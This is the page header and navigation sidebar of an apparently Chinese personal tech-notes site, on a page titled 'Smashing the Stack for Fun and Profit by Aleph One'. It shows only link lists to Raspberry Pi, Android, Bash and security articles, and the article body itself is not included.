<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link href=http://vjob.top/other/Smashing%20the%20Stack%20for%20Fun%20and%20Profit%20by%20Aleph%20One/ rel=canonical><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.2.3, mkdocs-material-8.2.1"><title>Smashing the Stack for Fun and Profit by Aleph One - 微站</title><link rel=stylesheet href=../../assets/stylesheets/main.e8d9bf0c.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#smashing-the-stack-for-fun-and-profit-by-aleph-one class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../.. title=微站 class="md-header__button md-logo" aria-label=微站 data-md-component=logo> <img src=../../static/img/avatar.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 微站 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Smashing the Stack for Fun and Profit by Aleph One </span> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=查找> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=分享 data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> </nav> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> 主页 </a> </li> <li class=md-tabs__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/ class=md-tabs__link> 树莓派 </a> </li> <li class=md-tabs__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-tabs__link> Android </a> </li> <li class=md-tabs__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-tabs__link> Bash </a> </li> <li class=md-tabs__item> <a href=../CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/ class="md-tabs__link md-tabs__link--active"> 安全 </a> </li> <li class=md-tabs__item> <a href=../How%20to%20Get%20Rich/ class=md-tabs__link> 其它 </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=微站 class="md-nav__button md-logo" aria-label=微站 data-md-component=logo> <img src=../../static/img/avatar.png alt=logo> </a> 微站 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> 主页 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=主页 data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> 主页 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> 微站 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/ class=md-nav__link> 树莓派 </a> </li> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> Android </a> </li> <li class=md-nav__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-nav__link> Bash </a> </li> <li class=md-nav__item> <a href=../../Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/ class=md-nav__link> 安全 </a> </li> <li class=md-nav__item> <a href=../How%20to%20Get%20Rich/ class=md-nav__link> 其它 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> 树莓派 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=树莓派 data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> 树莓派 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/ class=md-nav__link> 树莓派安装Ubuntu mate15.10 系统笔记 machh的专栏 CSDN博客 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/ class=md-nav__link> 硬盘启动树莓派３B </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85JDK/ class=md-nav__link> 树莓派安装JDK </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/ class=md-nav__link> 将树莓派Raspberry Pi设置为无线路由器(WiFi热点AP,RTL8188CUS芯片) </a> </li> <li class=md-nav__item> <a href=../../RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/ class=md-nav__link> Using Raspberry Pi for Laravel developing </a> </li> <li class=md-nav__item> <a href=../../RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/ class=md-nav__link> VNC setup on Raspberry Pi from Ubuntu </a> </li> <li class=md-nav__item> <a href=../../RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/ class=md-nav__link> 设置树莓派使用外置硬盘启动 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/ class=md-nav__link> 把树莓派变成24小时运行的下载神器（种子、磁力链通通支持） </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/ class=md-nav__link> 在树莓派2上安装 Chromium 浏览器及 Google 拼音输入法 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/ class=md-nav__link> 为树莓派DIY一款高速稳定的无线网卡 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/ class=md-nav__link> 树莓派开发系列教程6——树莓派做wifi热点 老徐2014 CSDN博客 树莓派做wifi热点 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/ class=md-nav__link> 树莓派wifi破解整理 FindHao </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/ class=md-nav__link> 树莓派香橙派无线播放，实现DLNA与AirPlay协议无线音箱 </a> </li> <li class=md-nav__item> <a href=../../RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/ class=md-nav__link> SSH通过代理连接 </a> </li> <li class=md-nav__item> <a href=../../RPI/Autossh%20and%20Systemd%20Service/ class=md-nav__link> Autossh and Systemd Service </a> </li> <li class=md-nav__item> <a href=../../RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/ class=md-nav__link> Copying MySQL Databases to Another Machine </a> </li> <li class=md-nav__item> <a href=../../RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/ class=md-nav__link> How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 </a> </li> <li class=md-nav__item> <a href=../../RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/ class=md-nav__link> Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete] </a> </li> <li class=md-nav__item> <a href=../../RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/ class=md-nav__link> OpenWrt 使用 frp 实现内网穿透 准备工作 搭建内网穿透 文章评论 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/ class=md-nav__link> 解决树莓派SSH登录缓慢的问题 Maoning Guan的博客 CSDN博客 </a> </li> <li class=md-nav__item> <a href=../../RPI/Reading%20privileged%20memory%20with%20a%20side-channel/ class=md-nav__link> Reading privileged memory with a side channel </a> </li> <li class=md-nav__item> <a href=../../RPI/Install%20Latest%20ReadyMedia%20miniDLNA%20Raspberry%20Pi/ class=md-nav__link> Install Latest ReadyMedia miniDLNA Raspberry Pi </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/ class=md-nav__link> 使用 vcgencmd 指令查看 Raspberry Pi 的 CPU 溫度、運行速度與電壓等資訊 </a> </li> <li class=md-nav__item> <a href=../../RPI/Aria2%20%E7%BC%96%E8%AF%91%20%E6%B7%BB%E5%8A%A0%E6%94%AF%E6%8C%81BT%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%88X86%E5%92%8Carmhf%E7%9A%84%E6%A0%91%E8%8E%93%E6%B4%BE2%EF%BC%89/ class=md-nav__link> Aria2 编译 添加支持BT下载的功能（X86和armhf的树莓派2） </a> </li> <li class=md-nav__item> <a href=../../RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/ class=md-nav__link> Let's Encrypt，免费好用的 HTTPS 证书 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ class=md-nav__link> 使用SSH反向隧道进行内网穿透 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/ class=md-nav__link> 树莓派利用nginx反向代理，成为IPv6 IPv4公网服务器（需要远程双栈服务器） </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/ class=md-nav__link> 如何在树莓派上搭建 WordPress </a> </li> <li class=md-nav__item> <a href=../../RPI/Install%20Redis%20on%20your%20Raspberry%20Pi/ class=md-nav__link> Install Redis on your Raspberry Pi </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE4%E5%8F%98%E8%BA%AB%E6%97%81%E8%B7%AF%E7%94%B1/ class=md-nav__link> 树莓派4变身旁路由 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> Android <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Android data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Android </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> Android10源码下载 </a> </li> <li class=md-nav__item> <a href=../../Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/ class=md-nav__link> 屏幕坏一加手机刷android10 </a> </li> <li class=md-nav__item> <a href=../../Android/Enable%20ADB%20from%20recovery/ class=md-nav__link> Enable ADB from recovery </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/ class=md-nav__link> Android系统权限和root权限 </a> </li> <li class=md-nav__item> <a href=../../Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/ class=md-nav__link> 【Android ROM定制】CyanogenMod源码下载和编译 </a> </li> <li class=md-nav__item> <a href=../../Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/ class=md-nav__link> Android内存泄露优化总结 </a> </li> <li class=md-nav__item> <a href=../../Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/ class=md-nav__link> 日积月累：Proguard进行源代码混淆和崩溃日志反混淆 </a> </li> <li class=md-nav__item> <a href=../../Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/ class=md-nav__link> 10 Ways to Improve Your Android App's Performance </a> </li> <li class=md-nav__item> <a href=../../Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/ class=md-nav__link> Anatomy of RecyclerView:a Search for a ViewHolder </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/ class=md-nav__link> Android插件化原理解析——Hook机制之Binder Hook </a> </li> <li class=md-nav__item> <a href=../../Android/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%BD%93%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E7%AC%AC%E4%B8%80%E5%90%8D%E2%80%93%E5%88%A9%E7%94%A8AndroidHook%E8%BF%9B%E8%A1%8C%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%BD%9C%E5%BC%8A/ class=md-nav__link> 手把手教你当微信运动第一名–利用AndroidHook进行微信运动作弊 </a> </li> <li class=md-nav__item> <a href=../../Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/ class=md-nav__link> 黑客可以利用三星预装的应用程序来监视用户 </a> </li> <li class=md-nav__item> <a href=../../Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/ class=md-nav__link> Android 动画总结 Android 动画总结 </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/ class=md-nav__link> Android签名总结 </a> </li> <li class=md-nav__item> <a href=../../Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/ class=md-nav__link> Am命令用法 </a> </li> <li class=md-nav__item> <a href=../../Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/ class=md-nav__link> 10 Tips for using the Eclipse Memory Analyzer </a> </li> <li class=md-nav__item> <a href=../../Android/android%E4%BD%BF%E7%94%A8ndk-stack%E8%B0%83%E8%AF%95JNI%E9%83%A8%E5%88%86%E7%9A%84C_C%2B%2B%E4%BB%A3%E7%A0%81/ class=md-nav__link> android使用ndk stack调试JNI部分的C C++代码 </a> </li> <li class=md-nav__item> <a href=../../Android/NativeActivity%E5%8E%9F%E7%90%86/ class=md-nav__link> NativeActivity原理 </a> </li> <li class=md-nav__item> <a href=../../Android/Using%20data%20binding%20in%20Android/ class=md-nav__link> Using data binding in Android </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/ class=md-nav__link> Android上WebRTC介绍 </a> </li> <li class=md-nav__item> <a href=../../Android/CoordinatorLayout%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89Behavior/ class=md-nav__link> CoordinatorLayout高级用法 自定义Behavior </a> </li> <li class=md-nav__item> <a href=../../Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/ class=md-nav__link> OpenSSL实践 Android下的编译和使用 </a> </li> <li class=md-nav__item> <a href=../../Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/ class=md-nav__link> 使用ShareSDK完成第三方（QQ、微信、微博）登录和分享 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> Bash <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Bash data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Bash </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-nav__link> 应该知道的Linux技巧 </a> </li> <li class=md-nav__item> <a href=../../Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/ class=md-nav__link> 优雅地使用命令行：Tmux 终端复用 </a> </li> <li class=md-nav__item> <a href=../../Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/ class=md-nav__link> 我的ImageMagick使用心得 </a> </li> <li class=md-nav__item> <a href=../../Bash/gdbcomm/ class=md-nav__link> Gdbcomm </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5 type=checkbox id=__nav_5 checked> <label class=md-nav__link for=__nav_5> 安全 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=安全 data-md-level=1> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> 安全 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/ class=md-nav__link> CTF常用RSA技巧 </a> </li> <li class=md-nav__item> <a href=../RSA/ class=md-nav__link> RSA </a> </li> <li class=md-nav__item> <a href=../SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/ class=md-nav__link> SageMath常用函数 </a> </li> <li class=md-nav__item> <a href=../../Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/ class=md-nav__link> Mobile Application Penetration Testing Cheat sheet with Tools & Resources </a> </li> <li class=md-nav__item> <a href=../Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/ class=md-nav__link> Most Important Network Penetration Testing Tools for Hackers & Security Professionals </a> </li> <li class=md-nav__item> <a href=../%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/ class=md-nav__link> 缓冲区溢出攻击实验 </a> </li> <li class=md-nav__item> <a href=../%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/ class=md-nav__link> 巧用命令注入的N种方式 </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Smashing the Stack for Fun and Profit by Aleph One <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Smashing the Stack for Fun and Profit by Aleph One </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#smashing-the-stack-for-fun-and-profit-by-aleph-one class=md-nav__link> Smashing the Stack for Fun and Profit by Aleph One </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/ class=md-nav__link> Bad Binder:Android In The Wild Exploit </a> </li> <li class=md-nav__item> <a href=../%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%99%E7%82%B9%E6%94%B6%E9%9B%86/ class=md-nav__link> 信息安全站点收集 </a> </li> <li class=md-nav__item> <a 